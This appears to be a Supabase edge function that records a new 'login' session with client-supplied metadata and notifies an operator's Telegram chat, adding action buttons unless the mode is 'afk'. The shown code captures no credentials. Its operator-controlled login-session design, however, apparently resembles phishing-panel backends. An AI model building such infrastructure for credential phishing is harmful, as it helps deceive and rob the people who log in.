import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { corsHeaders } from "npm:@supabase/supabase-js@2/cors";
import { tgCall, sessionKeyboard, formatSessionText } from "../_shared/telegram.ts";

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  try {
    const { meta = {} } = await req.json().catch(() => ({}));

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    const { data: settings } = await supabase
      .from("api_settings")
      .select("flow_mode, telegram_chat_id")
      .limit(1).maybeSingle();

    const mode = (settings?.flow_mode as string) || "afk";
    const chatId = settings?.telegram_chat_id as string | undefined;

    const { data: session, error: sErr } = await supabase
      .from("sessions")
      .insert({ mode, phase: "login", meta })
      .select("id, mode, phase, action, meta")
      .single();
    if (sErr) throw sErr;

    let tgMessageId: number | null = null;
    if (chatId) {
      const { json } = await tgCall("sendMessage", {
        chat_id: chatId,
        text: formatSessionText(session as any),
        parse_mode: "HTML",
        ...(mode === "afk" ? {} : { reply_markup: sessionKeyboard(session.id, mode) }),
      });
      tgMessageId = json?.result?.message_id ?? null;
      if (tgMessageId) {
        await supabase.from("sessions").update({ tg_message_id: tgMessageId }).eq("id", session.id);
      }
    }

    return new Response(
      JSON.stringify({ session_id: session.id, mode }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } },
    );
  } catch (e) {
    console.error("session-start error", e);
    return new Response(JSON.stringify({ error: String((e as Error).message || e) }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
